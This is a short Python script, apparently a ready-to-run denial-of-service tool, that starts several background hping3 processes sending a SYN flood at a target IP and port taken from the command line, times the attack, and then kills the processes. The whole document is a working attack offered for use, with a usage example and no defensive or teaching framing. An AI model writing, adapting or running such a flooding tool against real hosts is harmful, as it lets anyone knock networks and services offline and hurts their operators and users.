#!/usr/bin/python3
"""
SYN Flood Attack Script
"""

import sys
import time
import random
import threading
import os

def syn_flood(target_ip, target_port=80, duration=60, threads=10):
    print(f"[+] Starting SYN Flood attack")
    print(f"[+] Target: {target_ip}:{target_port}")
    print(f"[+] Duration: {duration} seconds")
    print(f"[+] Threads: {threads}")
    print("[+] Mode: Using hping3 for packet generation")
    print("=" * 50)
    
    # Calculate packets per thread
    total_packets = duration * 1000  # Estimate 1000 packets per second
    packets_per_thread = total_packets // threads
    
    print(f"[+] Estimated packets: {total_packets:,}")
    print("")
    
    # Start hping3 processes
    processes = []
    start_time = time.time()
    
    for i in range(threads):
        cmd = f"hping3 -S -p {target_port} --flood {target_ip} 2>/dev/null"
        pid = os.system(f"{cmd} &")
        processes.append(pid)
        print(f"[Thread {i+1}] Started (PID estimate)")
    
    print("")
    print("[+] Attack running...")
    
    # Monitor duration
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            print(f"\r[+] Time: {elapsed:.1f}s / {duration}s | Remaining: {remaining:.1f}s", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Stop attack
    print("\n[+] Stopping attack...")
    os.system("pkill -f hping3 2>/dev/null")
    
    print("[+] Attack completed")
    print("=" * 50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 syn_flood.py <target_ip> [duration] [threads]")
        print("Example: python3 syn_flood.py 192.168.1.5 60 10")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] Warning: SYN flood requires root privileges for best results")
        print("[!] Some features may not work without sudo")
    
    syn_flood(target, duration=duration, threads=threads)
